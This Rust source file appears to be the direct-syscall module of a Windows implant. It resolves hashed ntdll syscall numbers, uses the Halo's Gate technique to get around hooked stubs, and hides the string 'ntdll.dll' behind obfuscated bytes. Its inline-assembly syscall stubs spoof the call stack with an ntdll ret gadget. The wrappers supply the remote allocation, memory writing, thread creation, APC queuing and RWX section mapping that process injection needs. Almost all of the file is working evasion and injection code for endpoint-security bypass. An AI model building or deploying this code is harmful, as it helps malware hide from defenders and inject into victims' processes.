#![allow(unused)]

use core::arch::global_asm;
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;

#[repr(C)]
pub struct ClientId {
    pub process: isize,
    pub thread: isize,
}

pub const CURRENT_PROCESS: isize = -1isize;

#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    e_cblp: u16,
    e_cp: u16,
    e_crlc: u16,
    e_cparhdr: u16,
    e_minalloc: u16,
    e_maxalloc: u16,
    e_ss: u16,
    e_sp: u16,
    e_csum: u16,
    e_ip: u16,
    e_cs: u16,
    e_lfarlc: u16,
    e_ovno: u16,
    e_res: [u16; 4],
    e_oemid: u16,
    e_oeminfo: u16,
    e_res2: [u16; 10],
    e_lfanew: i32,
}

#[repr(C)]
struct ImageDataDirectory {
    virtual_address: u32,
    size: u32,
}

#[repr(C)]
struct ImageOptionalHeader64 {
    magic: u16,
    major_linker_version: u8,
    minor_linker_version: u8,
    size_of_code: u32,
    size_of_initialized_data: u32,
    size_of_uninitialized_data: u32,
    address_of_entry_point: u32,
    base_of_code: u32,
    image_base: u64,
    section_alignment: u32,
    file_alignment: u32,
    major_os_version: u16,
    minor_os_version: u16,
    major_image_version: u16,
    minor_image_version: u16,
    major_subsystem_version: u16,
    minor_subsystem_version: u16,
    win32_version_value: u32,
    size_of_image: u32,
    size_of_headers: u32,
    checksum: u32,
    subsystem: u16,
    dll_characteristics: u16,
    size_of_stack_reserve: u64,
    size_of_stack_commit: u64,
    size_of_heap_reserve: u64,
    size_of_heap_commit: u64,
    loader_flags: u32,
    number_of_rva_and_sizes: u32,
    data_directory: [ImageDataDirectory; 16],
}

#[repr(C)]
struct ImageNtHeaders64 {
    signature: u32,
    file_header_machine: u16,
    file_header_number_of_sections: u16,
    file_header_time_date_stamp: u32,
    file_header_pointer_to_symbol_table: u32,
    file_header_number_of_symbols: u32,
    file_header_size_of_optional_header: u16,
    file_header_characteristics: u16,
    optional_header: ImageOptionalHeader64,
}

#[repr(C)]
struct ImageExportDirectory {
    characteristics: u32,
    time_date_stamp: u32,
    major_version: u16,
    minor_version: u16,
    name: u32,
    base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinals: u32,
}

#[repr(C)]
pub struct ImageSectionHeader {
    pub name: [u8; 8],
    pub virtual_size: u32,
    pub virtual_address: u32,
    pub size_of_raw_data: u32,
    pub pointer_to_raw_data: u32,
    pub pointer_to_relocations: u32,
    pub pointer_to_linenumbers: u32,
    pub number_of_relocations: u16,
    pub number_of_linenumbers: u16,
    pub characteristics: u32,
}

const fn fnv1a(data: &[u8]) -> u32 {
    let mut hash: u32 = 0x811c9dc5;
    let mut i = 0;
    while i < data.len() {
        hash ^= data[i] as u32;
        hash = hash.wrapping_mul(0x01000193);
        i += 1;
    }
    hash
}

pub const HASH_NT_ALLOCATE_VIRTUAL_MEMORY: u32 = fnv1a(b"NtAllocateVirtualMemory");
pub const HASH_NT_FREE_VIRTUAL_MEMORY: u32 = fnv1a(b"NtFreeVirtualMemory");
pub const HASH_NT_PROTECT_VIRTUAL_MEMORY: u32 = fnv1a(b"NtProtectVirtualMemory");
pub const HASH_NT_WRITE_VIRTUAL_MEMORY: u32 = fnv1a(b"NtWriteVirtualMemory");
pub const HASH_NT_READ_VIRTUAL_MEMORY: u32 = fnv1a(b"NtReadVirtualMemory");
pub const HASH_NT_OPEN_PROCESS: u32 = fnv1a(b"NtOpenProcess");
pub const HASH_NT_CREATE_THREAD_EX: u32 = fnv1a(b"NtCreateThreadEx");
pub const HASH_NT_QUEUE_APC_THREAD: u32 = fnv1a(b"NtQueueApcThread");
pub const HASH_NT_UNMAP_VIEW_OF_SECTION: u32 = fnv1a(b"NtUnmapViewOfSection");
pub const HASH_NT_RESUME_THREAD: u32 = fnv1a(b"NtResumeThread");
pub const HASH_NT_SUSPEND_THREAD: u32 = fnv1a(b"NtSuspendThread");
pub const HASH_NT_CREATE_USER_PROCESS: u32 = fnv1a(b"NtCreateUserProcess");
pub const HASH_NT_QUERY_INFORMATION_PROCESS: u32 = fnv1a(b"NtQueryInformationProcess");
pub const HASH_NT_CLOSE: u32 = fnv1a(b"NtClose");
pub const HASH_NT_CREATE_SECTION: u32 = fnv1a(b"NtCreateSection");
pub const HASH_NT_MAP_VIEW_OF_SECTION: u32 = fnv1a(b"NtMapViewOfSection");
pub const HASH_NT_OPEN_SECTION: u32 = fnv1a(b"NtOpenSection");
pub const HASH_NT_QUERY_VIRTUAL_MEMORY: u32 = fnv1a(b"NtQueryVirtualMemory");

pub static mut SSN_NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0;
pub static mut SSN_NT_FREE_VIRTUAL_MEMORY: u32 = 0;
pub static mut SSN_NT_PROTECT_VIRTUAL_MEMORY: u32 = 0;
pub static mut SSN_NT_WRITE_VIRTUAL_MEMORY: u32 = 0;
pub static mut SSN_NT_READ_VIRTUAL_MEMORY: u32 = 0;
pub static mut SSN_NT_OPEN_PROCESS: u32 = 0;
#[no_mangle]
pub static mut SSN_NT_CREATE_THREAD_EX: u32 = 0;
pub static mut SSN_NT_QUEUE_APC_THREAD: u32 = 0;
pub static mut SSN_NT_UNMAP_VIEW_OF_SECTION: u32 = 0;
pub static mut SSN_NT_RESUME_THREAD: u32 = 0;
pub static mut SSN_NT_SUSPEND_THREAD: u32 = 0;
pub static mut SSN_NT_CREATE_USER_PROCESS: u32 = 0;
pub static mut SSN_NT_QUERY_INFORMATION_PROCESS: u32 = 0;
pub static mut SSN_NT_CLOSE: u32 = 0;
#[no_mangle]
pub static mut SSN_NT_CREATE_SECTION: u32 = 0;
#[no_mangle]
pub static mut SSN_NT_MAP_VIEW_OF_SECTION: u32 = 0;
pub static mut SSN_NT_OPEN_SECTION: u32 = 0;
pub static mut SSN_NT_QUERY_VIRTUAL_MEMORY: u32 = 0;

/// NtQueryInformationProcess(ProcessBasicInformation) result — ProcessBasicInformation (class 0).
/// Layout is stable across all NT 6.x+ versions.
#[repr(C)]
pub struct ProcessBasicInformation {
    pub exit_status: i32,
    _pad0: u32,
    pub peb_base_address: usize,
    pub affinity_mask: usize,
    pub base_priority: i32,
    _pad1: u32,
    pub unique_process_id: usize,
    pub inherited_from_unique_process_id: usize,
}

/// Address of a `ret` (0xC3) gadget inside ntdll.dll, set by init_stack_spoof().
/// Used by dm_syscall_spoofed to forge a clean call stack during syscalls.
#[no_mangle]
pub static mut DM_NTDLL_RET_GADGET: u64 = 0;

unsafe fn find_export(ntdll_base: *const u8, name_hash: u32) -> Option<*const u8> {
    let dos = &*(ntdll_base as *const ImageDosHeader);
    if dos.e_magic != 0x5A4D {
        return None;
    }
    let nt = &*((ntdll_base as usize + dos.e_lfanew as usize) as *const ImageNtHeaders64);
    if nt.signature != 0x00004550 {
        return None;
    }
    let export_dir_rva = nt.optional_header.data_directory[0].virtual_address as usize;
    if export_dir_rva == 0 {
        return None;
    }
    let export_dir = &*((ntdll_base as usize + export_dir_rva) as *const ImageExportDirectory);
    let names = core::slice::from_raw_parts(
        (ntdll_base as usize + export_dir.address_of_names as usize) as *const u32,
        export_dir.number_of_names as usize,
    );
    let ordinals = core::slice::from_raw_parts(
        (ntdll_base as usize + export_dir.address_of_name_ordinals as usize) as *const u16,
        export_dir.number_of_names as usize,
    );
    let functions = core::slice::from_raw_parts(
        (ntdll_base as usize + export_dir.address_of_functions as usize) as *const u32,
        export_dir.number_of_functions as usize,
    );
    for i in 0..export_dir.number_of_names as usize {
        let name_ptr = (ntdll_base as usize + names[i] as usize) as *const u8;
        let mut len = 0usize;
        while *name_ptr.add(len) != 0 {
            len += 1;
        }
        let name_bytes = core::slice::from_raw_parts(name_ptr, len);
        if fnv1a(name_bytes) == name_hash {
            let rva = functions[ordinals[i] as usize] as usize;
            return Some((ntdll_base as usize + rva) as *const u8);
        }
    }
    None
}

unsafe fn extract_ssn(stub: *const u8) -> Option<u32> {
    // Unhooked: 4C 8B D1 (mov r10,rcx) B8 xx xx xx xx (mov eax,N)
    if *stub == 0x4C && *stub.add(1) == 0x8B && *stub.add(2) == 0xD1 && *stub.add(3) == 0xB8 {
        let ssn = u32::from_le_bytes([
            *stub.add(4),
            *stub.add(5),
            *stub.add(6),
            *stub.add(7),
        ]);
        return Some(ssn);
    }
    None
}

unsafe fn halo_gate(stub: *const u8) -> Option<u32> {
    // NT stubs are ~0x20 bytes apart; scan neighbors to infer our SSN
    for i in 1usize..=20 {
        let up = stub.wrapping_add(i * 0x20);
        if let Some(ssn) = extract_ssn(up) {
            return Some(ssn.wrapping_sub(i as u32));
        }
        let down = stub.wrapping_sub(i * 0x20);
        if let Some(ssn) = extract_ssn(down) {
            return Some(ssn.wrapping_add(i as u32));
        }
    }
    None
}

unsafe fn resolve_ssn(name_hash: u32) -> Option<u32> {
    let s_ntdll = crate::obfs::dec(&[0x34,0x2E,0x3E,0x36,0x36,0x74,0x3E,0x36,0x36,0x5A]);
    let base = GetModuleHandleA(s_ntdll.as_ptr()) as *const u8;
    if base.is_null() {
        return None;
    }
    let stub = find_export(base, name_hash)?;
    extract_ssn(stub).or_else(|| halo_gate(stub))
}

pub fn init() -> bool {
    unsafe {
        macro_rules! resolve {
            ($hash:expr, $slot:expr) => {
                match resolve_ssn($hash) {
                    Some(s) => $slot = s,
                    None => return false,
                }
            };
        }
        resolve!(HASH_NT_ALLOCATE_VIRTUAL_MEMORY,    SSN_NT_ALLOCATE_VIRTUAL_MEMORY);
        resolve!(HASH_NT_FREE_VIRTUAL_MEMORY,         SSN_NT_FREE_VIRTUAL_MEMORY);
        resolve!(HASH_NT_PROTECT_VIRTUAL_MEMORY,      SSN_NT_PROTECT_VIRTUAL_MEMORY);
        resolve!(HASH_NT_WRITE_VIRTUAL_MEMORY,        SSN_NT_WRITE_VIRTUAL_MEMORY);
        resolve!(HASH_NT_READ_VIRTUAL_MEMORY,         SSN_NT_READ_VIRTUAL_MEMORY);
        resolve!(HASH_NT_OPEN_PROCESS,                SSN_NT_OPEN_PROCESS);
        resolve!(HASH_NT_CREATE_THREAD_EX,            SSN_NT_CREATE_THREAD_EX);
        resolve!(HASH_NT_QUEUE_APC_THREAD,            SSN_NT_QUEUE_APC_THREAD);
        resolve!(HASH_NT_UNMAP_VIEW_OF_SECTION,       SSN_NT_UNMAP_VIEW_OF_SECTION);
        resolve!(HASH_NT_RESUME_THREAD,               SSN_NT_RESUME_THREAD);
        resolve!(HASH_NT_SUSPEND_THREAD,              SSN_NT_SUSPEND_THREAD);
        resolve!(HASH_NT_CREATE_USER_PROCESS,         SSN_NT_CREATE_USER_PROCESS);
        resolve!(HASH_NT_QUERY_INFORMATION_PROCESS,   SSN_NT_QUERY_INFORMATION_PROCESS);
        resolve!(HASH_NT_CLOSE,                       SSN_NT_CLOSE);
        resolve!(HASH_NT_CREATE_SECTION,              SSN_NT_CREATE_SECTION);
        resolve!(HASH_NT_MAP_VIEW_OF_SECTION,         SSN_NT_MAP_VIEW_OF_SECTION);
        // Non-fatal: NtOpenSection / NtQueryVirtualMemory resolved opportunistically.
        if let Some(s) = resolve_ssn(HASH_NT_OPEN_SECTION) {
            SSN_NT_OPEN_SECTION = s;
        }
        if let Some(s) = resolve_ssn(HASH_NT_QUERY_VIRTUAL_MEMORY) {
            SSN_NT_QUERY_VIRTUAL_MEMORY = s;
        }
    }
    true
}

/// Scan ntdll.dll for a `ret` (0xC3) byte in an executable section and store its VA
/// in DM_NTDLL_RET_GADGET. Called from main() when the stack-spoof feature is enabled.
/// The gadget is used by dm_syscall_spoofed to make the kernel-visible call stack
/// appear to originate from ntdll instead of from agent code.
#[cfg(all(target_os = "windows", feature = "stack-spoof"))]
pub fn init_stack_spoof() {
    unsafe {
        let s_ntdll = crate::obfs::dec(&[0x34,0x2E,0x3E,0x36,0x36,0x74,0x3E,0x36,0x36,0x5A]);
        let base = GetModuleHandleA(s_ntdll.as_ptr()) as *const u8;
        if base.is_null() {
            return;
        }
        // Parse the section table to find an executable section, then scan for 0xC3
        // We do NOT scan blindly from offset 0 — that risks matching data or relocs.
        let dos = &*(base as *const ImageDosHeader);
        if dos.e_magic != 0x5A4D {
            return;
        }
        let nt = &*((base as usize + dos.e_lfanew as usize) as *const ImageNtHeaders64);
        if nt.signature != 0x00004550 {
            return;
        }
        let num_sections = nt.file_header_number_of_sections as usize;
        let opt_size     = nt.file_header_size_of_optional_header as usize;
        let sh_ptr = (base as usize
            + dos.e_lfanew as usize
            + 4 // signature
            + 20 // file header
            + opt_size) as *const ImageSectionHeader;
        for i in 0..num_sections {
            let sec = &*sh_ptr.add(i);
            const IMAGE_SCN_MEM_EXECUTE: u32 = 0x20000000;
            if sec.characteristics & IMAGE_SCN_MEM_EXECUTE == 0 {
                continue;
            }
            let sec_start = base.add(sec.virtual_address as usize);
            let sec_size  = sec.virtual_size as usize;
            // Skip the first 0x10 bytes; look for a standalone ret that's preceded by int3 or nop
            for j in 0x10..sec_size {
                if *sec_start.add(j) == 0xC3 {
                    // Prefer gadgets after a syscall sequence (0x0F 0x05) or int3 (0xCC)
                    // or nop (0x90) to reduce false positives
                    let prev = *sec_start.add(j - 1);
                    if prev == 0x05 || prev == 0xCC || prev == 0x90 {
                        DM_NTDLL_RET_GADGET = sec_start.add(j) as u64;
                        return;
                    }
                }
            }
            // Fall back: any ret in this section
            for j in 0x10..sec_size {
                if *sec_start.add(j) == 0xC3 {
                    DM_NTDLL_RET_GADGET = sec_start.add(j) as u64;
                    return;
                }
            }
        }
    }
}

// Generic 6-arg syscall dispatcher.
// Calling convention: rcx=ssn, rdx=a1, r8=a2, r9=a3, [rsp+0x28]=a4, [rsp+0x30]=a5, [rsp+0x38]=a6
// We shift args left by one position to fill NT's rcx/rdx/r8/r9/[rsp+0x28]/[rsp+0x30] slots,
// then set r10=rcx (NT convention) and execute syscall.
global_asm!(
    "dm_syscall:",
    "mov eax, ecx",
    "mov rcx, rdx",
    "mov rdx, r8",
    "mov r8, r9",
    "mov r9, [rsp+0x28]",
    "mov r10, [rsp+0x30]",
    "mov [rsp+0x28], r10",
    "mov r10, [rsp+0x38]",
    "mov [rsp+0x30], r10",
    "mov r10, rcx",
    "syscall",
    "ret",
);

// dm_syscall_spoofed: same as dm_syscall but replaces [rsp] with an ntdll ret gadget
// before the syscall instruction so the kernel's call-stack walker sees ntdll as the caller.
// Requires init_stack_spoof() to have found a valid gadget; falls through to plain syscall
// if DM_NTDLL_RET_GADGET is zero.
//
// Stack spoof mechanics:
//   On entry: rsp+0 = real return addr (our caller in agent code)
//             rsp+0x08..0x20 = shadow space (free for callee use)
//   We save the real return addr into shadow slot 2 (rsp+0x10), put the ntdll gadget at rsp+0,
//   execute `syscall` so the kernel's call-stack walk sees [ntdll_gadget → …], then restore.
#[cfg(all(target_arch = "x86_64", feature = "stack-spoof"))]
global_asm!(
    "dm_syscall_spoofed:",
    "mov eax, ecx",
    "mov rcx, rdx",
    "mov rdx, r8",
    "mov r8, r9",
    "mov r9, [rsp+0x28]",
    "mov r10, [rsp+0x30]",
    "mov [rsp+0x28], r10",
    "mov r10, [rsp+0x38]",
    "mov [rsp+0x30], r10",
    "mov r10, rcx",
    // Load gadget; skip spoof if it hasn't been initialised yet
    "mov r11, QWORD PTR [rip + DM_NTDLL_RET_GADGET]",
    "test r11, r11",
    "jz dm_syscall_spoofed_plain",
    // Save rcx (= a1) in shadow slot 1, use rcx as temp to swap ret addr
    "mov [rsp+0x08], rcx",
    "mov rcx, [rsp]",          // rcx = real return addr
    "mov [rsp+0x10], rcx",     // stash real return addr in shadow slot 2
    "mov [rsp], r11",          // put ntdll gadget at stack top
    "mov rcx, [rsp+0x08]",    // restore a1
    "syscall",
    // syscall clobbers r11 (kernel saves rflags there); reload real ret addr from shadow
    "mov r11, [rsp+0x10]",
    "mov [rsp], r11",
    "ret",
    "dm_syscall_spoofed_plain:",
    "syscall",
    "ret",
);

// NtCreateThreadEx takes 11 args so we cannot use dm_syscall (which only passes 6 NT args).
// This shim receives args in Windows x64 ABI and issues the syscall directly after loading
// SSN from the resolved static; the caller-supplied args 5-11 remain on the stack undisturbed.
global_asm!(
    "dm_create_thread_ex:",
    "mov r10, rcx",
    "mov eax, DWORD PTR [rip + SSN_NT_CREATE_THREAD_EX]",
    "syscall",
    "ret",
);

// NtCreateSection (7 args) and NtMapViewOfSection (10 args) use the same pattern.
// Caller supplies all args per Windows x64 ABI; shim sets r10=rcx and reads SSN
// from the resolved static.
global_asm!(
    "dm_create_section:",
    "mov r10, rcx",
    "mov eax, DWORD PTR [rip + SSN_NT_CREATE_SECTION]",
    "syscall",
    "ret",
    "dm_map_view_of_section:",
    "mov r10, rcx",
    "mov eax, DWORD PTR [rip + SSN_NT_MAP_VIEW_OF_SECTION]",
    "syscall",
    "ret",
);

extern "C" {
    pub fn dm_syscall(ssn: u32, a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64) -> i32;

    #[cfg(all(target_arch = "x86_64", feature = "stack-spoof"))]
    pub fn dm_syscall_spoofed(ssn: u32, a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64) -> i32;

    // Matches the 11-arg Windows x64 ABI layout for NtCreateThreadEx exactly.
    pub fn dm_create_thread_ex(
        thread_handle: *mut isize,  // rcx
        desired_access: u32,        // rdx
        object_attributes: *mut u8, // r8
        process_handle: isize,      // r9
        start_routine: *const u8,   // [rsp+0x28]
        argument: *mut u8,          // [rsp+0x30]
        create_flags: u32,          // [rsp+0x38]
        zero_bits: usize,           // [rsp+0x40]
        stack_size: usize,          // [rsp+0x48]
        maximum_stack_size: usize,  // [rsp+0x50]
        attribute_list: *mut u8,    // [rsp+0x58]
    ) -> i32;

    // NtCreateSection: 7 NT args in Windows x64 ABI layout.
    pub fn dm_create_section(
        section_handle:        *mut isize, // rcx
        desired_access:        u32,        // rdx
        object_attributes:     *mut u8,    // r8  (NULL = unnamed)
        maximum_size:          *mut i64,   // r9
        section_page_protect:  u32,        // [rsp+0x28]
        allocation_attributes: u32,        // [rsp+0x30]
        file_handle:           isize,      // [rsp+0x38]  (0 = pagefile-backed)
    ) -> i32;

    // NtMapViewOfSection: 10 NT args in Windows x64 ABI layout.
    pub fn dm_map_view_of_section(
        section_handle:       isize,          // rcx
        process_handle:       isize,          // rdx
        base_address:         *mut *mut u8,   // r8
        zero_bits:            usize,          // r9
        commit_size:          usize,          // [rsp+0x28]
        section_offset:       *mut i64,       // [rsp+0x30]  (NULL = from start)
        view_size:            *mut usize,     // [rsp+0x38]
        inherit_disposition:  u32,            // [rsp+0x40]  (2 = ViewUnmap)
        allocation_type:      u32,            // [rsp+0x48]
        win32_protect:        u32,            // [rsp+0x50]
    ) -> i32;
}

pub unsafe fn nt_alloc(
    process: isize,
    base: *mut *mut u8,
    zero_bits: usize,
    size: *mut usize,
    alloc_type: u32,
    protect: u32,
) -> i32 {
    #[cfg(all(target_arch = "x86_64", feature = "stack-spoof"))]
    { return dm_syscall_spoofed(
        SSN_NT_ALLOCATE_VIRTUAL_MEMORY,
        process as u64, base as u64, zero_bits as u64,
        size as u64, alloc_type as u64, protect as u64,
    ); }
    #[cfg(not(all(target_arch = "x86_64", feature = "stack-spoof")))]
    dm_syscall(
        SSN_NT_ALLOCATE_VIRTUAL_MEMORY,
        process as u64, base as u64, zero_bits as u64,
        size as u64, alloc_type as u64, protect as u64,
    )
}

pub unsafe fn nt_free(
    process: isize,
    base: *mut *mut u8,
    size: *mut usize,
    free_type: u32,
) -> i32 {
    dm_syscall(
        SSN_NT_FREE_VIRTUAL_MEMORY,
        process as u64,
        base as u64,
        size as u64,
        free_type as u64,
        0,
        0,
    )
}

pub unsafe fn nt_protect(
    process: isize,
    base: *mut *mut u8,
    size: *mut usize,
    new_prot: u32,
    old_prot: *mut u32,
) -> i32 {
    #[cfg(all(target_arch = "x86_64", feature = "stack-spoof"))]
    { return dm_syscall_spoofed(
        SSN_NT_PROTECT_VIRTUAL_MEMORY,
        process as u64, base as u64, size as u64,
        new_prot as u64, old_prot as u64, 0,
    ); }
    #[cfg(not(all(target_arch = "x86_64", feature = "stack-spoof")))]
    dm_syscall(
        SSN_NT_PROTECT_VIRTUAL_MEMORY,
        process as u64, base as u64, size as u64,
        new_prot as u64, old_prot as u64, 0,
    )
}

pub unsafe fn nt_write(
    process: isize,
    dest: *mut u8,
    src: *const u8,
    size: usize,
    written: *mut usize,
) -> i32 {
    dm_syscall(
        SSN_NT_WRITE_VIRTUAL_MEMORY,
        process as u64,
        dest as u64,
        src as u64,
        size as u64,
        written as u64,
        0,
    )
}

pub unsafe fn nt_read(
    process: isize,
    src: *const u8,
    dest: *mut u8,
    size: usize,
    read: *mut usize,
) -> i32 {
    dm_syscall(
        SSN_NT_READ_VIRTUAL_MEMORY,
        process as u64,
        src as u64,
        dest as u64,
        size as u64,
        read as u64,
        0,
    )
}

pub unsafe fn nt_open_process(
    handle: *mut isize,
    access: u32,
    obj_attrs: *mut u8,
    client_id: *mut ClientId,
) -> i32 {
    dm_syscall(
        SSN_NT_OPEN_PROCESS,
        handle as u64,
        access as u64,
        obj_attrs as u64,
        client_id as u64,
        0,
        0,
    )
}

pub unsafe fn nt_create_thread_ex(
    handle: *mut isize,
    access: u32,
    obj_attrs: *mut u8,
    process: isize,
    start: *const u8,
    param: *mut u8,
    flags: u32,
    zero_bits: usize,
    stack_size: usize,
    max_stack: usize,
    attr_list: *mut u8,
) -> i32 {
    dm_create_thread_ex(
        handle, access, obj_attrs, process, start, param,
        flags, zero_bits, stack_size, max_stack, attr_list,
    )
}

pub unsafe fn nt_queue_apc(
    thread: isize,
    apc_routine: *const u8,
    arg1: *mut u8,
    arg2: *mut u8,
    arg3: *mut u8,
) -> i32 {
    dm_syscall(
        SSN_NT_QUEUE_APC_THREAD,
        thread as u64,
        apc_routine as u64,
        arg1 as u64,
        arg2 as u64,
        arg3 as u64,
        0,
    )
}

pub unsafe fn nt_unmap_view(process: isize, base_address: *mut u8) -> i32 {
    dm_syscall(
        SSN_NT_UNMAP_VIEW_OF_SECTION,
        process as u64,
        base_address as u64,
        0,
        0,
        0,
        0,
    )
}

pub unsafe fn nt_resume_thread(thread: isize, suspend_count: *mut u32) -> i32 {
    dm_syscall(
        SSN_NT_RESUME_THREAD,
        thread as u64,
        suspend_count as u64,
        0,
        0,
        0,
        0,
    )
}

pub unsafe fn nt_suspend_thread(thread: isize, suspend_count: *mut u32) -> i32 {
    dm_syscall(
        SSN_NT_SUSPEND_THREAD,
        thread as u64,
        suspend_count as u64,
        0,
        0,
        0,
        0,
    )
}

/// NtQueryInformationProcess — class 0 = ProcessBasicInformation.
pub unsafe fn nt_query_information_process(
    process: isize,
    class: u32,
    info: *mut u8,
    info_len: u32,
    return_len: *mut u32,
) -> i32 {
    dm_syscall(
        SSN_NT_QUERY_INFORMATION_PROCESS,
        process as u64,
        class as u64,
        info as u64,
        info_len as u64,
        return_len as u64,
        0,
    )
}

pub unsafe fn nt_close(handle: isize) -> i32 {
    dm_syscall(SSN_NT_CLOSE, handle as u64, 0, 0, 0, 0, 0)
}

/// NtCreateSection — pagefile-backed anonymous section (no file handle).
/// page_prot: PAGE_EXECUTE_READWRITE (0x40).
/// alloc_attrs: SEC_COMMIT (0x08000000).
pub unsafe fn nt_create_section(
    handle:      *mut isize,
    access:      u32,
    max_size:    *mut i64,
    page_prot:   u32,
    alloc_attrs: u32,
) -> i32 {
    dm_create_section(
        handle,
        access,
        core::ptr::null_mut(),
        max_size,
        page_prot,
        alloc_attrs,
        0,
    )
}

pub unsafe fn nt_query_virtual_memory(
    process: isize,
    base_addr: *const u8,
    info_class: u32,
    info: *mut u8,
    info_len: usize,
    return_len: *mut usize,
) -> i32 {
    dm_syscall(
        SSN_NT_QUERY_VIRTUAL_MEMORY,
        process as u64,
        base_addr as u64,
        info_class as u64,
        info as u64,
        info_len as u64,
        return_len as u64,
    )
}

/// NtOpenSection — open an existing section object by NT object path.
/// `oa` must point to a valid OBJECT_ATTRIBUTES with a UNICODE_STRING name.
pub unsafe fn nt_open_section(
    handle: *mut isize,
    access: u32,
    oa:     *const u8,
) -> i32 {
    dm_syscall(
        SSN_NT_OPEN_SECTION,
        handle as u64,
        access as u64,
        oa     as u64,
        0, 0, 0,
    )
}

/// NtMapViewOfSection — map a view of `section` into `process`.
/// protect: desired page protection for this view (PAGE_READWRITE, PAGE_EXECUTE_READ, etc.).
pub unsafe fn nt_map_view(
    section:   isize,
    process:   isize,
    base:      *mut *mut u8,
    view_size: *mut usize,
    protect:   u32,
) -> i32 {
    dm_map_view_of_section(
        section,
        process,
        base,
        0,                          // zero_bits
        0,                          // commit_size (map all)
        core::ptr::null_mut(),      // section_offset (from start)
        view_size,
        2,                          // ViewUnmap
        0,                          // allocation_type
        protect,
    )
}
